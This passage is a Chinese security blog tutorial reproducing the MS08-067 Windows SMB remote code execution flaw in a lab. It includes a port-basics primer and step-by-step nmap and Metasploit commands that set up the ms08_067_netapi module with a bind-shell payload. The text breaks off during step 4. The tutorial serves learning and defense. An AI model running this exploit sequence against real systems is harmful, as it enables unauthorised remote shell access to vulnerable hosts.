---
title: [漏洞挖掘与防护] 02.漏洞利用之MS08-067远程代码执行漏洞复现及深度防御
url: https://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500579&idx=1&sn=ed3c9232e67f1e244ff09da7db10d0b8&chksm=cfcf73eef8b8faf886676005ab6a5702e6e37443049fcec999ae10c3ca3db386b039b73e9a42&scene=58&subscene=0#rd
source: 娜璋AI安全之家
date: 2024-07-15
fetch_date: 2025-10-06T17:41:00.497078
---

# [漏洞挖掘与防护] 02.漏洞利用之MS08-067远程代码执行漏洞复现及深度防御

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8micWiayvznnakwib1DVK8PsJEnzAFia5qU5ASjyFnXI9F08mJ42NYciclic4g/0?wx_fmt=jpeg)

# [漏洞挖掘与防护] 02.漏洞利用之MS08-067远程代码执行漏洞复现及深度防御

原创

eastmount

娜璋AI安全之家

> “
>
> 2024年4月28日是Eastmount的安全星球 —— 『网络攻防和AI安全之家』正式创建和运营的日子，该星球目前主营业务为 安全零基础答疑、安全技术分享、AI安全技术分享、AI安全论文交流、威胁情报每日推送、网络攻防技术总结、系统安全技术实战、面试求职、安全考研考博、简历修改及润色、学术交流及答疑、人脉触达、认知提升等。下面是星球的新人券，欢迎新老博友和朋友加入，一起分享更多安全知识，比较良心的星球，非常适合初学者和换安全专业的读者学习。
>
> ”

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZTxtlMEIJicPa3Fkxv0hsq6bPQFn74FAq7r23ziahWkGy74BLcYnTBM5QXk2GRXAPBVmsXwaxdheQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

这是作者新开的一个专栏——“漏洞挖掘与防护”，前期会复现各种经典和最新漏洞，并总结防护技巧；后期尝试从零学习漏洞挖掘技术，包括Web漏洞和二进制及IOT相关漏洞，以及Fuzzing技术。新的征程，新的开启，漫漫长征路，偏向虎山行。享受过程，感谢您的陪伴，一起加油~

上一篇文章将详细介绍Windows远程桌面服务漏洞（CVE-2019-0708），该高危漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击。这篇文章将详细讲解MS08-067远程代码执行漏洞（CVE-2008-4250）及防御过程，它是Windows Server服务RPC请求缓冲区溢出漏洞，利用445端口，并通过Metasploit工具获取shell及进行深入的操作。希望对入门的同学有帮助。

话不多说，让我们开始新的征程吧！您的点赞、评论、收藏将是对我最大的支持，感恩安全路上一路前行，如果有写得不好的地方，还请海涵。基础性文章，希望对您有所帮助，作者的目的是与安全人共同进步，加油！也强烈推荐大家去看看参考文献的视频和书籍。

**文章目录：**

* 一.学习路线
* 二.漏洞描述
* 三.环境搭建

+ 1.环境准备
+ 2.端口详解

* 四.利用Metasploit复现漏洞
* 五.常见错误及漏洞原因分析

+ 1.常见错误
+ 2.漏洞成因

* 六.总结

前文赏析：

* [[漏洞挖掘与防护] 01.漏洞利用之CVE-2019-0708复现及防御详解（含学习路线）](http://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg==&mid=2247500545&idx=1&sn=c368de62b1799d9850c42c3a7bca72e9&chksm=cfcf73ccf8b8fada84a8d0b81cb313c35bf108bcfae8ac34fb05574fdbbf5b6fdf83620cba41&scene=21#wechat_redirect)
* [漏洞挖掘与防护] 02.漏洞利用之MS08-067远程代码执行漏洞复现及深度防御

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。

---

# 一.学习路线

下面是本人准备从零学习漏洞挖掘（Fuzzing入门）的部分技术路线，作为初学者分享与大家学习，也欢迎大家留言补充和讨论，共勉。

1.基础

* 南大《程序分析》
  https://www.bilibili.com/video/BV1b7411K7P4
  https://haotianmichael.github.io/2021/05/04/NJU静态程序分析-1-Data-Flow-Analysis/
* fuzzingbook
  https://www.fuzzingbook.org/
* Fuzzing101
  https://github.com/antonio-morales/Fuzzing101
  https://blog.attify.com/fuzzing-iot-devices-part-1/
* 顶会论文阅读：安全四大顶会+软工顶会

2.技术

* AFL （源码解读）
* angr （直接从github学习吗？）：基本用法->实例
* 模糊测试、污点分析、符号执行【动静态】
* Ghidra（二进制、开源代表性工具）
* 内核模糊测试工具：syzkaller
* ASAN
* codeql
* MIASM

3.实战

* 固件漏洞实际分析
* 协议漏洞挖掘
* 软件漏洞挖掘
* Web渗透
* IoT漏洞分析（路由设备）
* 区块链漏洞挖掘（智能合约）
* CVE和CNVD申请
* n-day复现 => 0-day挖掘

4.趋势

* LLM+Fuzzing：推荐作者分享的南洋理工大学刘杨教授笔记（见『网络攻防和AI安全之家』知识星球）
* Web3+Fuzzing
* 卫星+Fuzzing

---

# 二.漏洞描述

MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC（Remote Procedure Call，远程过程调用）请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。

当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。它影响了某些旧版本的Windows系统，包括：

* Windows 2000
* Windows XP
* Windows Server 2003

漏洞原理：
MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的NEtPathCanonicalize函数时触发的。NetPathCanonicalize函数在远程访问其他主机时，会调用NetpwPathCanonicalize函数，对远程访问的路径进行规范化，而在NetpwPathCanonicalize函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。后续部分我将分析该漏洞的CFG流程图及漏洞成因。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mapRvZjibKANj0Oic8qA1w3picCLH0t5dODSMT0n4KIGUgC0gBZd4GHmJw/640?wx_fmt=png&from=appmsg)

> 本文参考了很多大佬的文章，再次感谢他们。实验部分是结合自己的实践和经验讲解，如果存在错误或不足之处，也请批评和指正。

---

# 三.环境搭建

## 1.环境准备

* 受害机：Windows XP SP1镜像
* 攻击机：Kali系统

第一步，在虚拟机中安装Windows XP SP1系统和Kali系统。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mib1WYbPHr7XgX8kkFQP108s8DBpAjh2RgU48lsibibQLJUyD7hW2PEjOQ/640?wx_fmt=png&from=appmsg)

第二步，虚拟机两个系统之间能够相互通信。

* Kali：192.168.44.136
* Win XP：192.168.44.135

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mwqaJ0TibTkEq6jr7L1tp2vuPVQ9PCBm7bbUoOaO8Nz98tWPdFEMRzMw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mvZKxH4NEicqoXusIwGz1CtHoLTWCRMic36M8ibQaSO41HpHib6Ka4wDZng/640?wx_fmt=png&from=appmsg)

第三步，打开Windows XP系统，确定445端口开启。如下图所示，在Win XP的CMD中输入“netstat -sn”查看端口445是否打开。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mfPSE5a8xJ8xrhfcLX7KjsFD15oicnrjzmM8icBKkjoU5lIbciaibLHAJNQ/640?wx_fmt=png&from=appmsg)

第四步，关闭Windows XP系统的防火墙。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mymVPxKw1EvGUw18sGppWmCibPtiayG5V0rG5l9a8Yiazp3MicWNkps322g/640?wx_fmt=png&from=appmsg)

做完这些初始准备之后，我们开始利用Kali系统进行漏洞复现。

---

## 2.端口详解

这里作者补充一些端口的基础知识，更有利于我们进行Web渗透实验。

(1) 端口作用
我们知道，一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎么区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系，实际上是通过“IP地址+端口号”来区分不同的服务的。

需要注意的是，端口并不是一一对应的。比如你的电脑作为客户机访问一台WWW服务器时，WWW服务器使用“80”端口与你的电脑通信，但你的电脑则可能使用“3456”这样的端口。如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8m4OYn1LbUaW8avh4TRov4DBarCrEFRGA2fGeKynYXsGNIOwxxQfqGag/640?wx_fmt=png&from=appmsg)

(2) 端口的分类
端口共1-65535号，知名端口范围从0到1023，这些端口号一般固定分配给一些服务，大家尽量不要使用。比如21端口分配给FTP服务，25端号分配给SMTP邮件传输协议服务，80端口分配给HTTP服务，135端口分配给RPC远程过程调用服务等等。

动态端口的范围从1024到65535，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序，在关闭程序进程后，就会释放所占用的端口号。注意，端口冲突就不能正常工作。

同时，动态端口号也常常被病毒木马程序所利用，如冰河默认连接端口号是7626、WAY 2.4连接端口号是8011、Netspy 3.0连接端口号是7306、YAI病毒连接端口号是1024等等。

(3) 常见的端口

| 端口号 | 含义 |
| --- | --- |
| 21 | FTP文件传输协议代理服务器常用端口号 |
| 22 | SSH安全登录、SCP文件传输、端口重定向端口号 |
| 23 | Telnet远程登录协议代理服务器常用端口号 |
| 25 | SMTP Simple Mail Transfer Protocol (E-mail) 端口号（木马Antigen、WinPC等开放该端口） |
| 53 | DNS域名解析服务端口号 |
| 80/8080 | HTTP协议代理服务器常用端口号 |
| 110 | POP3“邮局协议版本3”使用的端口号 |
| 443 | HTTPS加密的超文本传输服务端口号 |
| 445 | 通过SMB（服务器信息块）协议，访问各种共享文件夹或共享打印机 |
| 1080 | SOCKS代理协议服务器常用端口号 |
| 1433 | MSSQL SERVER数据库默认端口号 |
| 1521 | Oracle数据库服务端口号 |
| 1863 | MSN Messenger的文件传输功能所使用的端口号 |
| 3306 | MYSQL默认端口号 |
| 3389 | Microsoft RDP微软远程桌面使用的端口号 |
| 5631 | Symantec pcAnywhere远程控制数据传输时使用的端口号 |
| 5632 | Symantec pcAnywhere 主控端扫描被控端时使用的端口号 |
| 4000/8000 | 腾讯QQ端口号 |

(4) 黑客通过端口可以干什么

* 信息收集
* 目标探测
* 服务判断
* 系统判断
* 角色分析

(5) 445端口
谢公子大佬在 “135、137、138、139和445端口” 文章中介绍过这些端口，它们都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。

本篇文章的445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！

总之，公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。

---

# 四.利用Metasploit复现漏洞

* 攻击机：Kali - 192.168.44.136
* 受害机：Win XP - 192.168.44.135

第一步，利用Nmap工具扫描端口及确认该漏洞是否存在。

```
nmap -n -p 445 --script smb-vuln-ms08-067 192.168.44.135 --open
```

nmap漏扫脚本目录为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示MS0808-067漏洞存在且可以利用。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mbIO9nG8zx8uucNbvc2Me4nlAEQts1ZLd354V48t7BRduzbDxpUfFpQ/640?wx_fmt=png&from=appmsg)

或者使用 “nmap -sV -Pn 192.168.44.135” 查看目标主机开放的端口。目标机开放了135、139、445、1025、5000端口，且目标机系统为Windows XP。作为黑客，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。

```
nmap  -sV -Pn 192.168.44.135
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mRibh1sFO1LvuFo8pVHJXmy2xDtlxqTcXoiaXDPyEEuklWO5DibvvQAYwA/640?wx_fmt=png&from=appmsg)

第二步，进入Msfconsole并利用search语句查找漏洞利用模块。
终端内输入msfconsole打开metasploite命令行客户端，使用search命令查找ms08-067的漏洞利用模块。

```
msfconsolesearch ms08-067
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8m3iavVSzicXDlZolDMvxxZkDzhIq0AAcTTplclCp5OCQJiap8BqlzOCp5g/640?wx_fmt=png&from=appmsg)

---

第三步，进入漏洞模块，并查看相关的使用说明。
使用use命令选择我们要使用的利用模块。target设置为系统默认是自动定位，如果需要精确定位，可以show targets查看所有，然后进行选择。

```
use exploit/windows/smb/ms08_067_netapishow optionsshow targets
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mvypX8lQAEfuicHlfrFd6E3svjcCcwiaKjibsQ6RD7BciaLrYIvKGws8f2g/640?wx_fmt=png&from=appmsg)

第四步，设置攻击机、受害机信息。

```
# 目标机ipset RHOST 192.168.44.135# 端口号set RPORT 445# 设置payloadset payload generic/shell_bind_tcp# 攻击机ipset LHOST 192.168.44.136# 设置自动类型set target 0# 显示配置信息show options
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROKEl9UgPgdtS7f6icqwSr8mcXT8e589dZGW3BQmFnFnPF9eXjVQ7N8xtnCwue7pwQpNJ3olhpz2VA/640?wx_fm...